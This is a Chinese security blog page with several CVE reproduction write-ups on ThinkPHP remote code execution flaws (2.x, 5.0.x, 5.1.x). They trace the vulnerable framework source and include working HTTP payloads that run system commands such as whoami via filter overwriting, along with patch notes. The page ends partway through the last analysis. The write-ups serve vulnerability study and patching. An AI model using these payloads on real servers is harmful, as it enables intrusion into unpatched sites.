<h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><p>最近又被没有理想和目标所困扰,到底是我没有还是我不想有,反正最近是挺无聊的.多看点书,多思考一下吧</p>
<p>我要找到我热爱的目标,哪有什么东西能让你在整个过程一直热爱,过程必然辛苦,这也是最后实现时快乐的燃料,不过换一种思考角度就有可能不觉得辛苦了</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/01/31/我的2020/">http://blog.ccreater.top/2020/01/31/我的2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/01/31/%E6%88%91%E7%9A%842020/" data-id="cka3ckr3q004uv4v0bl52ehqb" data-title="我的2020" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-ThinkPHP 2.x任意代码执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2020-01-30T13:13:11.056Z" itemprop="datePublished">2020-01-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">ThinkPHP 2.x任意代码执行漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP-2-x任意代码执行漏洞"><a href="#ThinkPHP-2-x任意代码执行漏洞" class="headerlink" title="ThinkPHP 2.x任意代码执行漏洞"></a>ThinkPHP 2.x任意代码执行漏洞</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>thinkphp 2.1</p>
<p>官网的thinkphp 2.2已经修复了</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞位置</p>
<p><img src="https://i.loli.net/2020/01/30/8UW5mxvARaoFlPX.png" alt="image154"></p>
<p>路由解析处</p>
<p><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));</code></p>
<p>这个preg_replace有点古怪,没有用<code>/</code>来包围搜索模式而是用<code>@</code>,查找关于preg的文档发现</p>
<blockquote>
<p>当使用 PCRE 函数的时候，模式需要由<em>分隔符</em>闭合包裹。分隔符可以使任意非字母数字、非反斜线、非空白字符。   </p>
<p> 经常使用的分隔符是正斜线(<em>/</em>)、hash符号(<em>#</em>)   以及取反符号(<em>~</em>)。下面的例子都是使用合法分隔符的模式。    </p>
<pre><code>/foo bar/
#^[^0-9]$#
+php+
%[a-zA-Z0-9_-]%</code></pre></blockquote>
<p>替换常量,这个就变成了</p>
<p><code>preg_replace(&#39;@(\w+)/([^\/\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode(&#39;/&#39;,$paths));</code></p>
<p>查看preg_replace的介绍发现</p>
<blockquote>
<p>当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：’、”、 \ 和 NULL) 然后进行后向引用替换。当这些完成后请确保后向引用解析完后没有单引号或双引号引起的语法错误(比如： ‘strlen(&#39;$1&#39;)+strlen(“$2”)’)。确保符合PHP的 字符串语法，并且符合eval语法。因为在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。 </p>
</blockquote>
<p>执行<code>$replacement</code>(第二个参数)前,会先替换掉引用</p>
<p>我们可以看到,<code>$replacement</code>用双引号来包围引用<code>\\2</code>,会导致命令执行</p>
<p>构造</p>
<pre><code class="php">$paths=array(
    &#39;xxxx&#39;,
    &#39;${phpinfo()}&#39;
);</code></pre>
<p>则<code>&#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;</code>变为<code>$var[&#39;xxxx&#39;]=&quot;${phpinfo()}&quot;;</code></p>
<p>从而导致命令执行</p>
<p>于是构造payload</p>
<p><code>[http://127.0.0.1/public/index.php?s=/index/index/name/$%7B@phpinfo()%7D](http://127.0.0.1/public/index.php?s=/index/index/name/${@phpinfo()})</code></p>
<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p><img src="https://i.loli.net/2020/01/30/9AlHbyKzaBOJXnR.png" alt="image1293"></p>
<p>用单引号来包围所有引用就可以避免命令执行</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 2.x任意代码执行漏洞/](<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 2.x任意代码执行漏洞/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cka3ckr24000mv4v025048wah" data-title="ThinkPHP 2.x任意代码执行漏洞" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="2020-01-30T07:35:28.184Z" itemprop="datePublished">2020-01-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析"><a href="#ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析" class="headerlink" title="ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析"></a>ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>5.1.x-5.1.32  5.2.x(这个还没去看)</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>补丁: <a href="https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6</a> </p>
<p>测试环境 5.1.29</p>
<p><strong>入口处关闭报错</strong> </p>
<p><img src="https://i.loli.net/2020/01/30/2x4QWZYgmXjqo8r.png" alt="image283"></p>
<p>和5.0.x版本的漏洞有着相似之处,都是<code>$this-&gt;method</code>方法未过滤导致的任意变量覆盖,从而导致命令执行</p>
<p>通过<code>$_POST[&#39;_method&#39;]=xxxxx</code>来进行任意变量覆盖</p>
<p>我们选择覆盖<code>$this-&gt;filter</code>,翻找Request类中的函数发现还是<code>Request::input</code>处可以命令执行,下断点可以看到调用堆栈</p>
<p><img src="https://i.loli.net/2020/01/30/dVyPeZHbYM3TFq7.png" alt="image527"></p>
<p>我们从<code>Request::param</code>处开始分析</p>
<pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
    {
        if (!$this-&gt;mergeParam) {
            $method = $this-&gt;method(true);

            // 自动获取请求变量
            switch ($method) {
                case &#39;POST&#39;:
                    $vars = $this-&gt;post(false);
                    break;
                case &#39;PUT&#39;:
                case &#39;DELETE&#39;:
                case &#39;PATCH&#39;:
                    $vars = $this-&gt;put(false);
                    break;
                default:
                    $vars = [];
            }

            // 当前请求参数和URL地址中的参数合并
            $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));

            $this-&gt;mergeParam = true;
        }

        ...
    }</code></pre>
<p>因为是POST请求所以会进入POST分支,跟进<code>Request::post</code></p>
<pre><code class="php">    public function post($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
    {
        if (empty($this-&gt;post)) {
            $this-&gt;post = !empty($_POST) ? $_POST : $this-&gt;getInputData($this-&gt;input);
        }

        return $this-&gt;input($this-&gt;post, $name, $default, $filter);
    }</code></pre>
<p>接着便会调用<code>Request::input</code>,其中<code>$this-&gt;post</code>和<code>$filter</code>可控</p>
<p>跟进<code>Request::input</code></p>
<pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
    {
        ...

        // 解析过滤器
        $filter = $this-&gt;getFilter($filter, $default);

        if (is_array($data)) {
            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);
            reset($data);
        } else {
            $this-&gt;filterValue($data, $name, $filter);
        }

       ...
    }</code></pre>
<p>因为<code>$data</code>是数组(<code>$_POST</code>),调用<code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code></p>
<p>对<code>$data</code>中所有值调用<code>Request::filterValue</code></p>
<p>跟进去</p>
<pre><code class="php">private function filterValue(&amp;$value, $key, $filters)
    {
        $default = array_pop($filters);

        foreach ($filters as $filter) {
            if (is_callable($filter)) {
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);
            } elseif (is_scalar($value)) {
                if (false !== strpos($filter, &#39;/&#39;)) {
                    // 正则过滤
                    if (!preg_match($filter, $value)) {
                        // 匹配不成功返回默认值
                        $value = $default;
                        break;
                    }
                } elseif (!empty($filter)) {
                    // filter函数不存在时, 则使用filter_var进行过滤
                    // filter为非整形值时, 调用filter_id取得过滤id
                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
                    if (false === $value) {
                        $value = $default;
                        break;
                    }
                }
            }
        }

        return $value;
    }</code></pre>
<p>阅读代码可知,filterValue会对<code>$_POST</code>中所有值调用<code>$filter</code>中每一个可以调用的函数或方法</p>
<p>且<code>$filter</code>=<code>$_POST</code></p>
<p>因此有</p>
<pre><code>http://127.0.0.1/public/
POST:  var1=exec&amp;var2=calc.exe&amp;_method=filter</code></pre><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>对method进行了白名单限制</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/" target="_blank" rel="noopener">https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 5.1.x-5.2.x全版本RCE 漏洞分析/](<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 5.1.x-5.2.x全版本RCE 漏洞分析/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="cka3ckr2d0012v4v07xsd6xov" data-title="ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="2020-01-30T04:19:42.405Z" itemprop="datePublished">2020-01-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现"><a href="#ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现" class="headerlink" title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现"></a>ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> ThinkPHP 5.0.0~5.0.23 </p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code>http://127.0.0.1/index.php?s=captcha

post_ex1：_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami
post_exp2：_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><h2 id="过程复现-exp1"><a href="#过程复现-exp1" class="headerlink" title="过程复现(exp1)"></a>过程复现(exp1)</h2><p> 以 thinkphp 5.0.22 完整版为复现环境(为啥要完整版等会说)，下载地址：<a href="http://www.thinkphp.cn/down/1260.html" target="_blank" rel="noopener">http://www.thinkphp.cn/down/1260.html</a> </p>
<p> 官方补丁地址：<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a> </p>
<p><img src="https://i.loli.net/2020/01/30/LohuXMViDeg9AxT.png" alt="image562"></p>
<p>其中<code>$this-&gt;{$this-&gt;method}($_POST);</code>可以执行任意接受一个数组的request方法,<code>$this-&gt;method</code>可以通过控制<code>$_POST[&#39;_method&#39;]</code>来控制</p>
<p>查找相关方法后选定<code>__construct</code>来修改request属性再结合其他方法形成利用链</p>
<pre><code class="php">protected function __construct($options = [])
    {
        foreach ($options as $name =&gt; $item) {
            if (property_exists($this, $name)) {
                $this-&gt;$name = $item;
            }
        }
        if (is_null($this-&gt;filter)) {
            $this-&gt;filter = Config::get(&#39;default_filter&#39;);
        }

        // 保存 php://input
        $this-&gt;input = file_get_contents(&#39;php://input&#39;);
    }</code></pre>
<p>查找request中可能命令执行的方法时发现,input()方法可以通过修改filter来达到任意命令执行的效果</p>
<pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
    {
        ...

        // 解析过滤器
        $filter = $this-&gt;getFilter($filter, $default);

        if (is_array($data)) {
            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);//命令执行
            reset($data);
        } else {
            $this-&gt;filterValue($data, $name, $filter);
        }

        ...
    }</code></pre>
<p><img src="https://i.loli.net/2020/01/30/Fp5XRUNjlxABPWt.png" alt="image1678"></p>
<p>接着查找调用method()的地方,下断点</p>
<p><img src="https://i.loli.net/2020/01/30/F6ZvjtxGdP7uiKa.png" alt="image1768"></p>
<p>从入口点App.php开始查看可能作为攻击链一部分的地方</p>
<p>节选App.php关键内容</p>
<pre><code class="php">public static function run(Request $request = null)
    {
        $request = is_null($request) ? Request::instance() : $request;

        try {
            ...
            // 获取应用调度信息
            $dispatch = self::$dispatch;

            // 未设置调度信息则进行 URL 路由检测
            if (empty($dispatch)) {
                $dispatch = self::routeCheck($request, $config);
            }

            // 记录当前调度信息
            $request-&gt;dispatch($dispatch);

            // 记录路由和请求信息
            ...
            $data = self::exec($dispatch, $config);
        } catch (HttpResponseException $exception) {
            $data = $exception-&gt;getResponse();
        }
        ...
    }</code></pre>
<p>跟进routeCheck</p>
<pre><code class="php">public static function routeCheck($request, array $config)
    {
        $path   = $request-&gt;path();
        $depr   = $config[&#39;pathinfo_depr&#39;];
        $result = false;

        // 路由检测
        $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config[&#39;url_route_on&#39;];
        if ($check) {
            ...
            $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);
            ...
        }

        ...

        return $result;
    }</code></pre>
<p>跟进check,在获取method时调用了method方法</p>
<pre><code class="php">public static function check($request, $url, $depr = &#39;/&#39;, $checkDomain = false)
    {
        //检查解析缓存
        ...
        $method = strtolower($request-&gt;method());
        // 获取当前请求类型的路由规则
       ...
    }</code></pre>
<p>返回App.php,我们可以看到一个敏感的函数<code>$data = self::exec($dispatch, $config);</code></p>
<p>跟进exec瞧一瞧</p>
<pre><code class="php">protected static function exec($dispatch, $config)
    {
        switch ($dispatch[&#39;type&#39;]) {
            case &#39;redirect&#39;: // 重定向跳转
                $data = Response::create($dispatch[&#39;url&#39;], &#39;redirect&#39;)
                    -&gt;code($dispatch[&#39;status&#39;]);
                break;
            case &#39;module&#39;: // 模块/控制器/操作
                $data = self::module(
                    $dispatch[&#39;module&#39;],
                    $config,
                    isset($dispatch[&#39;convert&#39;]) ? $dispatch[&#39;convert&#39;] : null
                );
                break;
            case &#39;controller&#39;: // 执行控制器操作
                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);
                $data = Loader::action(
                    $dispatch[&#39;controller&#39;],
                    $vars,
                    $config[&#39;url_controller_layer&#39;],
                    $config[&#39;controller_suffix&#39;]
                );
                break;
            case &#39;method&#39;: // 回调方法
                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);
                $data = self::invokeMethod($dispatch[&#39;method&#39;], $vars);
                break;
            case &#39;function&#39;: // 闭包
                $data = self::invokeFunction($dispatch[&#39;function&#39;]);
                break;
            case &#39;response&#39;: // Response 实例
                $data = $dispatch[&#39;response&#39;];
                break;
            default:
                throw new \InvalidArgumentException(&#39;dispatch type not support&#39;);
        }

        return $data;
    }</code></pre>
<p>如果<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39;</code>时会调用<code>Request::instance()-&gt;param()</code></p>
<pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
    {
        if (empty($this-&gt;mergeParam)) {
            $method = $this-&gt;method(true);
            // 自动获取请求变量
            ...
            $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
            $this-&gt;mergeParam = true;
        }
        ...
        return $this-&gt;input($this-&gt;param, $name, $default, $filter);
    }</code></pre>
<p>而param则会调用input从而形成完整的攻击链,其中<code>$filter</code>时我们要执行的命令,<code>$this-&gt;param</code>则是参数,</p>
<p><code>$this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</code></p>
<p>但是我们不能直接通过修改<code>__construct</code>来修改param,因为在运行过程中<code>$this-&gt;param</code>会被覆盖,但是<code>$this-&gt;get</code>却不会,于是我们需要覆盖<code>$this-&gt;filter</code>和<code>$this-&gt;get</code></p>
<p>接下来就是如何让<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39;</code>的问题了</p>
<p><img src="https://i.loli.net/2020/01/30/qeliaZJokYSUMg2.png" alt="image5781"></p>
<p>这也是为啥要tp完整版的原因,完整版里才有captcha模块</p>
<blockquote>
<p>注意我们请求的路由是<code>?s=captcha</code>，它对应的注册规则为<code>\think\Route::get</code>。在<code>method</code>方法结束后，返回的<code>$this-&gt;method</code>值应为<code>get</code>这样才能不出错，所以payload中有个<code>method=get</code> </p>
</blockquote>
<p>于是最后的payload是</p>
<pre><code>http://127.0.0.1/index.php?s=captcha

_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></pre><h2 id="过程复现-exp2"><a href="#过程复现-exp2" class="headerlink" title="过程复现(exp2)"></a>过程复现(exp2)</h2><p>攻击链的前面基本相同,只有调用<code>Request::input</code>方法的地方不同而进入不同分支</p>
<p>我们看到<code>Request::param</code>方法</p>
<pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
    {
        if (empty($this-&gt;mergeParam)) {
            $method = $this-&gt;method(true);
            // 自动获取请求变量
            ...
            $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
            $this-&gt;mergeParam = true;
        }
        ...
        return $this-&gt;input($this-&gt;param, $name, $default, $filter);
    }</code></pre>
<p>注意这一个<code>$this-&gt;method(true);</code></p>
<p><code>Request::method</code></p>
<pre><code class="php">    public function method($method = false)
    {
        if (true === $method) {
            // 获取原始请求类型
            return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
        } 
        ...
    }</code></pre>
<p>它会调用<code>Request::server</code>,而这个方法也会调用<code>Request::input</code></p>
<pre><code class="php">public function server($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
    {
        if (empty($this-&gt;server)) {
            $this-&gt;server = $_SERVER;
        }
        if (is_array($name)) {
            return $this-&gt;server = array_merge($this-&gt;server, $name);
        }
        return $this-&gt;input($this-&gt;server, false === $name ? false : strtoupper($name), $default, $filter);
    }</code></pre>
<p>继续分析代码发现,rce的参数变为了<code>$this-&gt;server[&#39;REQUEST_METHOD&#39;]</code></p>
<pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
    {
        if (&#39;&#39; != $name) {
            // 解析name
            if (strpos($name, &#39;/&#39;)) {
                list($name, $type) = explode(&#39;/&#39;, $name);
            } else {
                $type = &#39;s&#39;;
            }
            // 按.拆分成多维数组进行判断
            foreach (explode(&#39;.&#39;, $name) as $val) {
                if (isset($data[$val])) {
                    $data = $data[$val];
                } else {
                    // 无输入数据，返回默认值
                    return $default;
                }
            }
            if (is_object($data)) {
                return $data;
            }
        }

        // 解析过滤器
        $filter = $this-&gt;getFilter($filter, $default);

        ...
        return $data;
    }</code></pre>
<p>于是有</p>
<pre><code class="php">http://127.0.0.1/public/index.php?s=captcha

POST:

_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="[https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/](https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-漏洞分析/)">Smi1e —- ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a></p>
<p> <a href="https://xz.aliyun.com/t/3845#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845#toc-2</a> </p>
<p> <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 5.0.0<del>5.0.23 RCE 漏洞复现/](<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 5.0.0</del>5.0.23 RCE 漏洞复现/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="cka3ckr27000uv4v0ev3xbplw" data-title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-tp5rce复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/01/28/tp5rce%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="2020-01-28T07:33:24.775Z" itemprop="datePublished">2020-01-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/01/28/tp5rce%E5%A4%8D%E7%8E%B0/">tp5rce复现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="tp5rce复现"><a href="#tp5rce复现" class="headerlink" title="tp5rce复现"></a>tp5rce复现</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote>
<h3 id="本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5-0-23和5-1-31之前的所有版本，推荐尽快更新到最新版本。"><a href="#本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5-0-23和5-1-31之前的所有版本，推荐尽快更新到最新版本。" class="headerlink" title="本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。"></a>本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。</h3><p><strong>如果暂时无法更新到最新版本，请开启强制路由并添加相应未定义路由，或者参考commit的修改 增加相关代码。</strong></p>
<p>–来自thinkphp官网</p>
</blockquote>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>根据官方的公告去寻找相关commit发现漏洞位置</p>
<p><img src="https://i.loli.net/2020/01/28/5EDWfFXvmqSuJk3.png" alt="image302"></p>
<p>查看所有调用controller的函数发现有个敏感的函数名exec,不过这个是tp自己实现的</p>
<pre><code class="php">    public function exec()
    {
        // 监听module_init
        $this-&gt;app[&#39;hook&#39;]-&gt;listen(&#39;module_init&#39;);

        try {
            // 实例化控制器
            $instance = $this-&gt;app-&gt;controller($this-&gt;controller,
                $this-&gt;rule-&gt;getConfig(&#39;url_controller_layer&#39;),
                $this-&gt;rule-&gt;getConfig(&#39;controller_suffix&#39;),
                $this-&gt;rule-&gt;getConfig(&#39;empty_controller&#39;));

            if ($instance instanceof Controller) {
                $instance-&gt;registerMiddleware();
            }
        } catch (ClassNotFoundException $e) {
            throw new HttpException(404, &#39;controller not exists:&#39; . $e-&gt;getClass());
        }
    ...
    }</code></pre>
<p>跟进controller</p>
<pre><code class="php">    public function controller($name, $layer = &#39;controller&#39;, $appendSuffix = false, $empty = &#39;&#39;)
    {
        list($module, $class) = $this-&gt;parseModuleAndClass($name, $layer, $appendSuffix);

        if (class_exists($class)) {
            return $this-&gt;__get($class);
        } elseif ($empty &amp;&amp; class_exists($emptyClass = $this-&gt;parseClass($module, $layer, $empty, $appendSuffix))) {
            return $this-&gt;__get($emptyClass);
        }

        throw new ClassNotFoundException(&#39;class not exists:&#39; . $class, $class);
    }</code></pre>
